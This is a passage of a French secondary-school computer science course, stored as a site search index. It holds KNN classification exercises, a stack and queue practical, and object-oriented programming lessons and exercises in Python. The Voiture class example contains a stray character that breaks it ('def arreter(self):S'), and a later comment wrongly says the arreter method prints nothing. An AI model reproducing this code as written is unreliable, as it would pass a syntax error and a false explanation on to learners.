(KNN)","text":""},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#objectif","title":"Objectif","text":"<p>L'objectif de ce TP est de mettre en pratique l'algorithme des K Plus Proches Voisins (KNN) sur un petit ensemble de donn\u00e9es.</p>"},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#exercice-1-douceur-dun-fruit","title":"Exercice 1 : Douceur d'un fruit","text":""},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#contexte","title":"Contexte","text":"<p>Imaginons que nous ayons des donn\u00e9es sur des fruits, caract\u00e9ris\u00e9s par leur douceur (sur une \u00e9chelle de 1 \u00e0 10) et leur acidit\u00e9 (sur une \u00e9chelle de 1 \u00e0 10). Nous voulons pr\u00e9dire si un nouveau fruit est une \"Pomme\" ou une \"Orange\".</p> <p>Nos donn\u00e9es d'entra\u00eenement sont :</p> Fruit Douceur Acidit\u00e9 Type Fruit 1 7 3 Pomme Fruit 2 8 2 Pomme Fruit 3 3 7 Orange Fruit 4 4 8 Orange Fruit 5 6 4 Pomme Fruit 6 2 6 Orange <p>Nouveau fruit \u00e0 classifier : Fruit X (Douceur = 5, Acidit\u00e9 = 5)</p> <p>\u00c0 r\u00e9aliser</p> <ol> <li> <p>Repr\u00e9senter les donn\u00e9es :     Cr\u00e9er une liste de dictionnaires pour stocker les donn\u00e9es d'entra\u00eenement.</p> </li> <li> <p>Calculer la distance euclidienne :     \u00c9crire une fonction <code>distance_euclidienne(point1, point2)</code> qui prend deux points (chacun \u00e9tant un tuple ou une liste de coordonn\u00e9es, par exemple <code>(douceur, acidite)</code> et retourne leur distance euclidienne).     Rappel : <code>d = \u221a((x2-x1)\u00b2 + (y2-y1)\u00b2)</code></p> </li> <li> <p>Trouver les K voisins :     \u00c9crire une fonction <code>trouver_voisins(donnees_entrainement, point_test, k)</code> qui :</p> <ul> <li>Calcule la distance entre <code>point_test</code> et chaque point dans <code>donnees_entrainement</code>.</li> <li>Stocke ces distances avec les types de fruits correspondants.</li> <li>Trie les voisins par distance croissante.</li> <li>Retourne les <code>k</code> premiers voisins (les plus proches).</li> </ul> </li> <li> <p>Pr\u00e9dire la classe :     \u00c9crire une fonction <code>predire_classe(voisins)</code> qui prend la liste des <code>k</code> voisins et retourne la classe majoritaire parmi eux.</p> </li> <li> <p>Mettre tout ensemble :     Utiliser les fonctions pr\u00e9c\u00e9dentes pour pr\u00e9dire la classe du Fruit X avec K=3.</p> </li> </ol>"},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#exercice-2-classification-de-fleurs-iris-simplifie","title":"Exercice 2 : Classification de fleurs Iris (simplifi\u00e9)","text":""},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#contexte_1","title":"Contexte","text":"<p>Nous allons appliquer l'algorithme KNN \u00e0 un ensemble de donn\u00e9es simplifi\u00e9 de fleurs Iris, caract\u00e9ris\u00e9es par la longueur de leurs s\u00e9pales et de leurs p\u00e9tales. Nous voulons distinguer deux types de fleurs : Setosa et Versicolor.</p> <p>Nos donn\u00e9es d'entra\u00eenement sont :</p> Fleur Longueur S\u00e9pale Longueur P\u00e9tale Type Fleur A 5.1 1.4 Setosa Fleur B 4.9 1.4 Setosa Fleur C 6.0 5.1 Versicolor Fleur D 5.5 4.0 Versicolor Fleur E 5.2 1.5 Setosa Fleur F 6.3 4.8 Versicolor <p>Nouvelle fleur \u00e0 classifier : Fleur Y (Longueur S\u00e9pale = 5.8, Longueur P\u00e9tale = 3.5)</p> <p>\u00c0 r\u00e9aliser</p> <ol> <li> <p>Repr\u00e9senter les donn\u00e9es :     Cr\u00e9er une liste de dictionnaires pour stocker les donn\u00e9es d'entra\u00eenement, incluant les mesures et le type de fleur.</p> </li> <li> <p>Calculer la distance euclidienne :     \u00c9crire la fonction <code>distance_euclidienne</code> de l'Exercice 1 pour calculer la distance entre deux points (ici, <code>(longueur_sepale, longueur_petale)</code>).</p> </li> <li> <p>Trouver les K voisins :     \u00c9crire la fonction <code>trouver_voisins</code> pour trouver les K voisins les plus proches de la Fleur Y dans les donn\u00e9es d'entra\u00eenement.</p> </li> <li> <p>Pr\u00e9dire la classe :     \u00c9crire la fonction <code>predire_classe</code> pour d\u00e9terminer la classe majoritaire parmi les K voisins.</p> </li> <li> <p>Mettre tout ensemble :     Utiliser les fonctions pr\u00e9c\u00e9dentes pour pr\u00e9dire la classe de la Fleur Y avec K=5.</p> </li> </ol>"},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#exercice-3-detection-de-spam-conceptuel","title":"Exercice 3 : D\u00e9tection de spam (conceptuel)","text":""},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/#contexte_2","title":"Contexte","text":"<p>Imaginons un syst\u00e8me simplifi\u00e9 de d\u00e9tection de spam bas\u00e9 sur KNN. Nous caract\u00e9risons les emails par deux mesures : le nombre de mots cl\u00e9s suspects (comme \"gratuit\", \"offre\", \"gagner\") et la longueur de l'email (en nombre de caract\u00e8res, normalis\u00e9e sur une \u00e9chelle de 1 \u00e0 10).</p> <p>Nos donn\u00e9es d'entra\u00eenement sont :</p> Email Mots cl\u00e9s suspects Longueur Email Type Email 1 8 9 Spam Email 2 2 3 Non-Spam Email 3 7 8 Spam Email 4 1 2 Non-Spam Email 5 9 7 Spam Email 6 3 4 Non-Spam <p>Nouvel email \u00e0 classifier : Email Z (Mots cl\u00e9s suspects = 6, Longueur Email = 6)</p> <p>\u00c0 r\u00e9aliser</p> <ol> <li> <p>Repr\u00e9senter les donn\u00e9es :     Cr\u00e9er une liste de dictionnaires pour stocker les donn\u00e9es d'entra\u00eenement, incluant les mesures et le type d'email.</p> </li> <li> <p>Calculer la distance euclidienne :     \u00c9crire une fonction <code>distance_euclidienne</code> pour calculer la distance entre deux points (ici, <code>(mots_cles_suspects, longueur_email)</code>).</p> </li> <li> <p>Trouver les K voisins :     \u00c9crire une fonction <code>trouver_voisins</code> pour trouver les K voisins les plus proches de l'Email Z dans les donn\u00e9es d'entra\u00eenement.</p> </li> <li> <p>Pr\u00e9dire la classe :     \u00c9crire une fonction <code>predire_classe</code> pour d\u00e9terminer la classe majoritaire parmi les K voisins.</p> </li> <li> <p>Mettre tout ensemble :     Utiliser les fonctions pr\u00e9c\u00e9dentes pour pr\u00e9dire la classe de l'Email Z avec K=3.</p> </li> </ol>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/","title":"TP : Impl\u00e9mentation de Piles et Files en Python","text":""},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/#objectif","title":"Objectif","text":"<p>Impl\u00e9menter les structures de donn\u00e9es Pile (LIFO) et File (FIFO) en utilisant la Programmation Orient\u00e9e Objet en Python.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/#partie-1-la-pile-stack","title":"Partie 1 - La Pile (Stack)","text":"<pre><code>class Pile:\n    \"\"\"\n    Classe impl\u00e9mentant une structure de pile (LIFO)\n    \"\"\"\n    def __init__(self):\n        # \u00c0 compl\u00e9ter : initialiser la structure de donn\u00e9es\n        pass\n\n    def empiler(self, element):\n        \"\"\"Ajoute un \u00e9l\u00e9ment au sommet de la pile\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def depiler(self):\n        \"\"\"Retire et retourne l'\u00e9l\u00e9ment du sommet de la pile\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def est_vide(self):\n        \"\"\"Retourne True si la pile est vide, False sinon\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def sommet(self):\n        \"\"\"Retourne l'\u00e9l\u00e9ment du sommet sans le retirer\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n</code></pre>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/#application","title":"Application","text":"<pre><code>def verifier_parentheses(expression):\n    \"\"\"\n    V\u00e9rifie si une expression parenth\u00e9s\u00e9e est valide\n    Retourne True si valide, False sinon\n    \"\"\"\n    pile = Pile()\n    # \u00c0 compl\u00e9ter\n    pass\n\n# Tests\nprint(verifier_parentheses(\"((a+b)*(c-d))\"))  # Doit afficher True\nprint(verifier_parentheses(\"((a+b)*c-d))\"))   # Doit afficher False\n</code></pre>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/#partie-2-la-file-queue","title":"Partie 2 - La File (Queue)","text":"<pre><code>class File:\n    \"\"\"\n    Classe impl\u00e9mentant une structure de file (FIFO)\n    \"\"\"\n    def __init__(self):\n        # \u00c0 compl\u00e9ter : initialiser la structure de donn\u00e9es\n        pass\n\n    def enfiler(self, element):\n        \"\"\"Ajoute un \u00e9l\u00e9ment \u00e0 la fin de la file\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def defiler(self):\n        \"\"\"Retire et retourne l'\u00e9l\u00e9ment du d\u00e9but de la file\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def est_vide(self):\n        \"\"\"Retourne True si la file est vide, False sinon\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n\n    def tete(self):\n        \"\"\"Retourne l'\u00e9l\u00e9ment du d\u00e9but sans le retirer\"\"\"\n        # \u00c0 compl\u00e9ter\n        pass\n</code></pre>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/TP_piles_files/#application_1","title":"Application","text":"<pre><code>def simuler_file_attente():\n    \"\"\"\n    Simule une file d'attente avec priorit\u00e9\n    \"\"\"\n    file_normale = File()\n    file_prioritaire = File()\n    # \u00c0 compl\u00e9ter\n    pass\n\n# Tests\nsimuler_file_attente()\n</code></pre>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/","title":"Fiche de Cours : Introduction \u00e0 la Programmation Orient\u00e9e Objet (POO)","text":""},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/#1-quest-ce-que-la-programmation-orientee-objet","title":"1. Qu'est-ce que la Programmation Orient\u00e9e Objet ?","text":"<p>La Programmation Orient\u00e9e Objet (POO) est une mani\u00e8re de concevoir et d'\u00e9crire des programmes informatiques. Au lieu de penser en termes de fonctions et de proc\u00e9dures, on pense en termes d'objets.</p> <p>Un objet est une entit\u00e9 qui poss\u00e8de des attributs (des donn\u00e9es qui le caract\u00e9risent) et des m\u00e9thodes (des actions qu'il peut effectuer).</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/#2-les-classes-modeles-pour-les-objets","title":"2. Les Classes : Mod\u00e8les pour les Objets","text":"<p>En POO, on utilise des classes pour cr\u00e9er des objets. Une classe est comme un plan ou un moule qui d\u00e9finit comment les objets de ce type seront structur\u00e9s et comment ils se comporteront.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/#exemple-la-classe-voiture","title":"Exemple : La classe <code>Voiture</code>","text":"<p>Regardons un exemple concret avec une classe <code>Voiture</code>. Imaginons que nous voulons repr\u00e9senter des voitures dans notre programme.</p> <pre><code>class Voiture:\n    # C'est le \"constructeur\". Il est appel\u00e9 quand on cr\u00e9e un nouvel objet Voiture.\n    def __init__(self, immatriculation, marque, modele, annee, couleur):\n        # Ce sont les attributs de notre voiture\n        self.immatriculation = immatriculation\n        self.marque = marque\n        self.modele = modele\n        self.annee = annee\n        self.couleur = couleur\n        self.est_demarre = False # Par d\u00e9faut, une voiture est arr\u00eat\u00e9e\n\n    # C'est une m\u00e9thode sp\u00e9ciale qui d\u00e9finit comment l'objet doit \u00eatre affich\u00e9\n    # quand on utilise print()\n    def __str__(self):\n        return f\"Voiture {self.immatriculation} de marque {self.marque} et de mod\u00e8le {self.modele}.\"\n\n    # Voici une m\u00e9thode pour d\u00e9marrer la voiture\n    def demarrer(self):\n        self.est_demarre = True\n        print(f\"La voiture {self.immatriculation} d\u00e9marre.\")\n\n    # Et une m\u00e9thode pour l'arr\u00eater\n    def arreter(self):S\n        self.est_demarre = False\n        print(f\"La voiture {self.immatriculation} s'arr\u00eate.\")\n</code></pre> <p>Explications :</p> <ul> <li><code>class Voiture:</code> : D\u00e9finit une nouvelle classe nomm\u00e9e <code>Voiture</code>.</li> <li><code>__init__(self, ...)</code> : C'est le constructeur. Il est appel\u00e9 automatiquement lorsqu'on cr\u00e9e une nouvelle instance (un nouvel objet) de la classe <code>Voiture</code>. Le mot-cl\u00e9 <code>self</code> fait r\u00e9f\u00e9rence \u00e0 l'instance de l'objet qui est en train d'\u00eatre cr\u00e9\u00e9. Les autres param\u00e8tres (<code>immatriculation</code>, <code>marque</code>, etc.) sont les valeurs que l'on fournira pour initialiser les attributs de la voiture.</li> <li><code>self.immatriculation = immatriculation</code> : Cr\u00e9e un attribut <code>immatriculation</code> pour l'objet <code>self</code> et lui assigne la valeur pass\u00e9e en param\u00e8tre.</li> <li><code>__str__(self)</code> : C'est une m\u00e9thode sp\u00e9ciale. Python l'appelle quand on essaie de convertir un objet <code>Voiture</code> en cha\u00eene de caract\u00e8res (par exemple, avec <code>print(ma_voiture)</code>).</li> <li><code>demarrer(self)</code> et <code>arreter(self)</code> : Ce sont des m\u00e9thodes que les objets <code>Voiture</code> peuvent ex\u00e9cuter. Elles modifient l'attribut <code>est_demarre</code> et affichent un message.</li> </ul>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/#3-creer-et-utiliser-des-objets-instances","title":"3. Cr\u00e9er et Utiliser des Objets (Instances)","text":"<p>Une fois la classe d\u00e9finie, on peut cr\u00e9er des instances (des objets sp\u00e9cifiques) de cette classe.</p> <pre><code># Cr\u00e9ation d'un objet (une instance) de la classe Voiture\nma_voiture_bleue = Voiture(\"AB-123-CD\", \"Renault\", \"Clio\", 2020, \"bleu\")\nune_autre_voiture = Voiture(\"XY-789-ZW\", \"Peugeot\", \"3008\", 2022, \"gris\")\n\n# Acc\u00e9der aux attributs\nprint(f\"La couleur de ma premi\u00e8re voiture est : {ma_voiture_bleue.couleur}\") # Affiche: bleu\nprint(f\"L'ann\u00e9e de l'autre voiture est : {une_autre_voiture.annee}\") # Affiche: 2022\n\n# Utiliser les m\u00e9thodes\nprint(ma_voiture_bleue) # Appelle la m\u00e9thode __str__\nma_voiture_bleue.demarrer() # Affiche: La voiture AB-123-CD d\u00e9marre.\nprint(f\"Ma voiture bleue est d\u00e9marr\u00e9e : {ma_voiture_bleue.est_demarre}\") # Affiche: True\n\nune_autre_voiture.arreter() # La m\u00e9thode arreter n'affiche rien par d\u00e9faut dans notre exemple, mais modifie self.est_demarre\nprint(f\"L'autre voiture est d\u00e9marr\u00e9e : {une_autre_voiture.est_demarre}\") # Affiche: False\n</code></pre>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_cours/#4-pourquoi-utiliser-la-poo","title":"4. Pourquoi utiliser la POO ?","text":"<ul> <li>Organisation : La POO aide \u00e0 structurer le code de mani\u00e8re plus logique, en regroupant les donn\u00e9es et les fonctions qui les manipulent.</li> <li>R\u00e9utilisabilit\u00e9 : Les classes peuvent \u00eatre r\u00e9utilis\u00e9es pour cr\u00e9er de nombreux objets.</li> <li>Modularit\u00e9 : Chaque objet est une entit\u00e9 ind\u00e9pendante, ce qui facilite la modification et la maintenance du code.</li> <li>Abstraction : On peut utiliser un objet sans avoir besoin de conna\u00eetre tous les d\u00e9tails de son fonctionnement interne.</li> </ul>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/","title":"Fiche d'Exercices : TP Concessionnaire Automobile","text":""},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#objectif","title":"Objectif","text":"<p>L'objectif de ce TP est de mettre en pratique les concepts de base de la Programmation Orient\u00e9e Objet (POO) en Python. Vous allez mod\u00e9liser un syst\u00e8me simple de gestion de voitures dans un concessionnaire.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#exercices-dintroduction","title":"Exercices d'introduction","text":"<ul> <li>Avoir lu la fiche de cours sur l'introduction \u00e0 la POO.</li> <li>Avoir un environnement Python fonctionnel.</li> </ul>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#partie-1-la-classe-voiture-rappel-et-complements","title":"Partie 1 : La Classe <code>Voiture</code> (Rappel et Compl\u00e9ments)","text":"<p>Nous allons r\u00e9utiliser et compl\u00e9ter la classe <code>Voiture</code> vue en cours.</p> <pre><code>class Voiture:\n    def __init__(self, immatriculation, marque, modele, annee, couleur):\n        self.immatriculation = immatriculation\n        self.marque = marque\n        self.modele = modele\n        self.annee = annee\n        self.couleur = couleur\n        self.est_demarre = False\n\n    def __str__(self):\n        # TODO 1: Am\u00e9liorer cette m\u00e9thode pour qu'elle affiche aussi si la voiture est d\u00e9marr\u00e9e ou non.\n        # Exemple de retour attendu: \"Voiture AA-123-BB de marque Renault et de mod\u00e8le Clio (D\u00e9marr\u00e9e)\"\n        # ou \"Voiture CC-456-DD de marque Peugeot et de mod\u00e8le 208 (Arr\u00eat\u00e9e)\"\n        return f\"Voiture {self.immatriculation} de marque {self.marque} et de mod\u00e8le {self.modele}.\"\n\n    def demarrer(self):\n        if not self.est_demarre:\n            self.est_demarre = True\n            print(f\"La voiture {self.immatriculation} d\u00e9marre.\")\n        else:\n            print(f\"La voiture {self.immatriculation} est d\u00e9j\u00e0 d\u00e9marr\u00e9e.\")\n\n    def arreter(self):\n        if self.est_demarre:\n            self.est_demarre = False\n            print(f\"La voiture {self.immatriculation} s'arr\u00eate.\")\n        else:\n            print(f\"La voiture {self.immatriculation} est d\u00e9j\u00e0 arr\u00eat\u00e9e.\")\n\n    # TODO 2: Ajouter une m\u00e9thode repeindre(self, nouvelle_couleur)\n    # Cette m\u00e9thode doit changer la couleur de la voiture et afficher un message\n    # indiquant l'ancienne et la nouvelle couleur.\n    # Exemple: \"La voiture AB-123-CD passe de la couleur bleu \u00e0 rouge.\"\n</code></pre> <p>Exercices sur la classe <code>Voiture</code> :</p> <ol> <li>Compl\u00e9ter <code>__str__</code> : Modifier la m\u00e9thode <code>__str__</code> pour qu'elle indique \u00e9galement l'\u00e9tat (d\u00e9marr\u00e9e ou arr\u00eat\u00e9e) de la voiture, comme indiqu\u00e9 dans le commentaire <code>TODO 1</code>.</li> <li>M\u00e9thode <code>repeindre</code> : Ajouter une nouvelle m\u00e9thode <code>repeindre(self, nouvelle_couleur)</code> \u00e0 la classe <code>Voiture</code> comme d\u00e9crit dans le <code>TODO 2</code>.</li> <li>Tester la classe <code>Voiture</code> :<ul> <li>Cr\u00e9er au moins deux objets <code>Voiture</code> diff\u00e9rents.</li> <li>Afficher ces voitures en utilisant <code>print()</code>.</li> <li>Essayer de d\u00e9marrer une voiture d\u00e9j\u00e0 d\u00e9marr\u00e9e.</li> <li>Essayer d'arr\u00eater une voiture d\u00e9j\u00e0 arr\u00eat\u00e9e.</li> <li>Repeindre une de vos voitures et l'afficher \u00e0 nouveau pour v\u00e9rifier le changement de couleur.</li> </ul> </li> </ol>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#partie-2-la-classe-concessionnaire","title":"Partie 2 : La Classe <code>Concessionnaire</code>","text":"<p>Maintenant, nous allons cr\u00e9er une classe <code>Concessionnaire</code> qui pourra g\u00e9rer un ensemble de voitures.</p> <pre><code>class Concessionnaire:\n    def __init__(self, nom, adresse):\n        self.nom = nom\n        self.adresse = adresse\n        self.voitures_en_stock = [] # Une liste pour stocker les objets Voiture\n\n    def __str__(self):\n        # TODO 3: Am\u00e9liorer cette m\u00e9thode pour qu'elle affiche le nom du concessionnaire\n        # et le nombre de voitures en stock.\n        # Exemple: \"Concessionnaire 'SuperAutos' situ\u00e9 \u00e0 '123 Rue de la Paix' (Stock: 5 voitures)\"\n        return f\"Concessionnaire {self.nom} \u00e0 l'adresse {self.adresse}.\"\n\n    def ajouter_voiture(self, voiture):\n        # TODO 4: Impl\u00e9menter cette m\u00e9thode.\n        # Elle doit ajouter l'objet 'voiture' (qui est une instance de la classe Voiture)\n        # \u00e0 la liste self.voitures_en_stock.\n        # Afficher un message confirmant l'ajout.\n        # Exemple: \"La voiture XY-789-ZW a \u00e9t\u00e9 ajout\u00e9e au stock de SuperAutos.\"\n        pass\n\n    def afficher_stock(self):\n        # TODO 5: Impl\u00e9menter cette m\u00e9thode.\n        # Si le stock est vide, afficher \"Le stock de [nom du concessionnaire] est actuellement vide.\"\n        # Sinon, afficher \"Voici les voitures en stock chez [nom du concessionnaire]:\"\n        # puis, pour chaque voiture dans self.voitures_en_stock, afficher ses informations\n        # en utilisant sa m\u00e9thode __str__().\n        pass\n\n    def rechercher_voiture(self, immatriculation):\n        # TODO 6: Impl\u00e9menter cette m\u00e9thode.\n        # Elle doit parcourir self.voitures_en_stock.\n        # Si une voiture avec l'immatriculation donn\u00e9e est trouv\u00e9e, la retourner.\n        # Sinon, retourner None et afficher \"Aucune voiture avec l'immatriculation [immatriculation] trouv\u00e9e.\"\n        pass\n\n    def vendre_voiture(self, immatriculation):\n        # TODO 7: Impl\u00e9menter cette m\u00e9thode.\n        # 1. Utiliser rechercher_voiture pour trouver la voiture.\n        # 2. Si la voiture est trouv\u00e9e:\n        #    a. La retirer de self.voitures_en_stock.\n        #    b. Afficher un message: \"La voiture [immatriculation] a \u00e9t\u00e9 vendue par [nom du concessionnaire] !\"\n        #    c. Retourner l'objet voiture vendu.\n        # 3. Si la voiture n'est pas trouv\u00e9e, afficher un message appropri\u00e9 et ne rien retourner.\n        pass\n</code></pre> <p>Exercices sur la classe <code>Concessionnaire</code> :</p> <ol> <li>Compl\u00e9ter <code>__str__</code> (TODO 3) : Modifier la m\u00e9thode <code>__str__</code> de <code>Concessionnaire</code>.</li> <li>Impl\u00e9menter <code>ajouter_voiture</code> (TODO 4).</li> <li>Impl\u00e9menter <code>afficher_stock</code> (TODO 5).</li> <li>Impl\u00e9menter <code>rechercher_voiture</code> (TODO 6).</li> <li>Impl\u00e9menter <code>vendre_voiture</code> (TODO 7).</li> </ol>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#partie-3-interaction-et-scenario-complet","title":"Partie 3 : Interaction et Sc\u00e9nario Complet","text":"<ol> <li>Cr\u00e9er un Concessionnaire : Instancier un objet de la classe <code>Concessionnaire</code>.</li> <li>Cr\u00e9er des Voitures : Instancier au moins 3 objets <code>Voiture</code> diff\u00e9rents.</li> <li>Ajouter les Voitures au Concessionnaire : Utiliser la m\u00e9thode <code>ajouter_voiture</code> de votre concessionnaire.</li> <li>Afficher le Stock : Utiliser <code>afficher_stock</code>.</li> <li>Tester la Recherche :<ul> <li>Rechercher une voiture existante par son immatriculation et afficher ses informations si elle est trouv\u00e9e.</li> <li>Rechercher une voiture non existante.</li> </ul> </li> <li>Tester la Vente :<ul> <li>Vender une voiture existante. Afficher le stock apr\u00e8s la vente pour v\u00e9rifier.</li> <li>Essayer de vendre une voiture d\u00e9j\u00e0 vendue ou non existante.</li> </ul> </li> <li>Interactions suppl\u00e9mentaires :<ul> <li>Prendre une voiture du stock (par exemple, en la recherchant), d\u00e9marrer-la, repeigner-la, puis afficher \u00e0 nouveau le stock du concessionnaire (la voiture dans le stock devrait refl\u00e9ter ces changements si vous avez bien manipul\u00e9 les objets).</li> </ul> </li> </ol>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Ajouter une m\u00e9thode <code>valeur_stock(self)</code> \u00e0 <code>Concessionnaire</code> qui calcule la valeur totale des voitures en stock (devrer ajouter un attribut <code>prix</code> \u00e0 la classe <code>Voiture</code>).</li> <li>Permettre \u00e0 un concessionnaire d'avoir une liste de voitures d'occasion et une liste de voitures neuves.</li> <li>Ajouter d'autres attributs ou m\u00e9thodes qui pourraient \u00eatre utiles pour <code>Voiture</code> ou <code>Concessionnaire</code>.</li> </ul>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#exercices-dapplication","title":"Exercices d'application","text":"<p>\u26a0\ufe0f Attention</p> <p>Ces exercices sont ind\u00e9pendants du TP Concessionnaire Automobile et permettent de pratiquer d'autres aspects de la Programmation Orient\u00e9e Objet.</p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#exercices-dintroduction_1","title":"\ud83c\udfaf Exercices d'introduction","text":"<ol> <li>Cr\u00e9er une classe <code>Personne</code> avec les attributs <code>nom</code>, <code>prenom</code> et <code>age</code>. Ajouter une m\u00e9thode <code>se_presenter</code> qui affiche \"Je m'appelle [prenom] [nom] et j'ai [age] ans\". \u2b50</li> </ol> \u2705 Correction <pre><code>class Personne:\n    def __init__(self, nom, prenom, age):\n        self.nom = nom\n        self.prenom = prenom\n        self.age = age\n\n    def se_presenter(self):\n        print(f\"Je m'appelle {self.prenom} {self.nom} et j'ai {self.age} ans\")\n</code></pre> <ol> <li> <p>Cr\u00e9er deux objets de la classe <code>Personne</code> et appeler leur m\u00e9thode <code>se_presenter</code>. \u2b50</p> </li> <li> <p>Ajouter une m\u00e9thode <code>est_majeur</code> \u00e0 la classe <code>Personne</code> qui renvoie <code>True</code> si la personne a 18 ans ou plus, et <code>False</code> sinon. \u2b50</p> </li> </ol>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#niveau-facile","title":"\ud83c\udf1f Niveau Facile","text":"<p>\ud83d\udcbb Compte bancaire simple \u2b50</p> <p>\u00c9crire une classe <code>CompteBancaire</code> avec les attributs <code>titulaire</code> (cha\u00eene de caract\u00e8res), <code>solde</code> (nombre) et les m\u00e9thodes <code>deposer(montant)</code>, <code>retirer(montant)</code> et <code>afficher_solde()</code>. Exemple : <pre><code>compte = CompteBancaire(\"Jean Dupont\", 1000)\ncompte.deposer(500)  # Le solde est maintenant de 1500\ncompte.retirer(200)  # Le solde est maintenant de 1300\ncompte.afficher_solde()  # Affiche \"Solde du compte de Jean Dupont : 1300 euros\"\n</code></pre></p> <p>Rectangle et calculs \u2b50</p> <p>\u00c9crire une classe <code>Rectangle</code> avec les attributs <code>longueur</code> et <code>largeur</code> et les m\u00e9thodes <code>calculer_aire()</code>, <code>calculer_perimetre()</code> et <code>est_carre()</code>. Exemple : <pre><code>rect = Rectangle(5, 3)\nprint(rect.calculer_aire())  # Affiche 15\nprint(rect.calculer_perimetre())  # Affiche 16\nprint(rect.est_carre())  # Affiche False\n</code></pre></p> <p>Livre et biblioth\u00e8que \u2b50</p> <p>\u00c9crire une classe <code>Livre</code> avec les attributs <code>titre</code>, <code>auteur</code> et <code>annee_publication</code>. Puis cr\u00e9er une classe <code>Bibliotheque</code> qui peut stocker des livres et offre des m\u00e9thodes pour ajouter un livre, afficher tous les livres et rechercher un livre par titre. Exemple : <pre><code>livre1 = Livre(\"Le Petit Prince\", \"Antoine de Saint-Exup\u00e9ry\", 1943)\nlivre2 = Livre(\"1984\", \"George Orwell\", 1949)\n\nbiblio = Bibliotheque()\nbiblio.ajouter_livre(livre1)\nbiblio.ajouter_livre(livre2)\nbiblio.afficher_livres()  # Affiche les informations des deux livres\nlivre_trouve = biblio.rechercher_livre(\"1984\")\nprint(livre_trouve.auteur)  # Affiche \"George Orwell\"\n</code></pre></p>"},{"location":"premiere/XII-Pour_aller_plus_loin/Programmation_Orientee_Objet/fiche_exercices/#niveau-intermediaire","title":"Niveau Interm\u00e9diaire","text":"<p>H\u00e9ritage simple \u2b50\u2b50</p> <p>Cr\u00e9er une classe <code>Animal</code> avec les attributs <code>nom</code> et <code>age</code> et une m\u00e9thode <code>faire_bruit()</code> qui affiche \"L'animal fait un bruit\". Ensuite, cr\u00e9er deux classes d\u00e9riv\u00e9es <code>Chien</code> et <code>Chat</code> qui h\u00e9ritent d'<code>Animal</code> et qui red\u00e9finissent la m\u00e9thode <code>faire_bruit()</code> pour afficher respectivement \"Le chien aboie\" et \"Le chat miaule\". Exemple : <pre><code>animal = Animal(\"Bestiole\", 5)\nanimal.faire_bruit()  # Affiche \"L'animal fait un bruit\"\n\nchien = Chien(\"Rex\", 3)\nchien.faire_bruit()  # Affiche \"Le chien aboie\"\n\nchat = Chat(\"F\u00e9lix\", 2)\nchat.faire_bruit()  # Affiche \"Le chat miaule\"\n</code></pre></p> <p>Encapsulation et propri\u00e9t\u00e9s \u2b50\u2b50</p> <p>Cr\u00e9er une classe <code>Etudiant</code> avec un attribut priv\u00e9 <code>__notes</code> (liste) et des m\u00e9thodes pour ajouter une note, calculer la moyenne et obtenir la note maximale. Utiliser des propri\u00e9t\u00e9s pour acc\u00e9der de mani\u00e8re contr\u00f4l\u00e9e aux attributs priv\u00e9s. Exemple : <pre><code>etudiant = Etudiant(\"Jean Dupont\")\netudiant.ajouter_note(15)\netudiant.ajouter_note(18)\netudiant.ajouter_note(12)\nprint(etudiant.moyenne)  # Utilise la propri\u00e9t\u00e9 pour calculer et afficher 15.0\nprint(etudiant.note_max)  # Utilise la propri\u00e9t\u00e9 pour trouver et afficher 18\n</code></pre></p> <p>Forme g\u00e9om\u00e9trique et polymorphisme \u2b50\u2b50</p> <p>Cr\u00e9er une classe abstraite <code>Forme</code> avec une m\u00e9thode abstraite <code>calculer_aire()</code>. Ensuite, cr\u00e9er des classes d\u00e9riv\u00e9es <code>Cercle</code> et <code>Triangle</code> qui impl\u00e9mentent cette m\u00e9thode. 